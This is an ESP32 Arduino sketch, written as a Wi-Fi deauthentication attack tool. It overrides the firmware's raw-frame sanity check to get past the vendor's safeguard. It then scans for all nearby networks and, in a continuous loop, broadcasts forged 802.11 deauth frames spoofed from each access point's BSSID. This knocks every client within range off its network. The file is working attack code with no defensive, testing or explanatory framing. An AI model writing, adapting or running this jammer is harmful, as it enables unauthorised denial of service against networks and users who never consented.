extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

#include "WiFi.h"
#include "esp_wifi.h"

// Global variables
int wifi_channel = 1;

void setup() {
  Serial.begin(115200);

  // Initialize WiFi in STA mode
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();

  // Enable promiscuous mode if needed (optional for deauth)
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(wifi_channel, WIFI_SECOND_CHAN_NONE);

  Serial.println("Scanning for networks...");
}

void loop() {
  // Scan for networks
  int numNetworks = WiFi.scanNetworks();
  Serial.print("Networks found: ");
  Serial.println(numNetworks);

  for (int i = 0; i < numNetworks; ++i) {
    Serial.print(i + 1);
    Serial.print(": ");
    Serial.print(WiFi.SSID(i));
    Serial.print(" (");
    Serial.print(WiFi.BSSIDstr(i));
    Serial.print(") on channel ");
    Serial.println(WiFi.channel(i));

    // Set the correct channel for sending deauth frames
    esp_wifi_set_channel(WiFi.channel(i), WIFI_SECOND_CHAN_NONE);

    // Construct deauth frame
    uint8_t deauthPacket[26] = {
      0xC0, 0x00,  // Frame Control (Deauth frame)
      0xFF, 0xFF,  // Duration
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Broadcast Destination MAC
      WiFi.BSSID(i)[0], WiFi.BSSID(i)[1], WiFi.BSSID(i)[2], // AP BSSID
      WiFi.BSSID(i)[3], WiFi.BSSID(i)[4], WiFi.BSSID(i)[5], // AP BSSID
      WiFi.BSSID(i)[0], WiFi.BSSID(i)[1], WiFi.BSSID(i)[2], // AP BSSID
      WiFi.BSSID(i)[3], WiFi.BSSID(i)[4], WiFi.BSSID(i)[5], // AP BSSID
      0x00, 0x00  // Sequence Control
    };

    // Send deauth frame
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), true);
    Serial.print("Deauth packet sent to network: ");
    Serial.println(WiFi.SSID(i));
  }
}
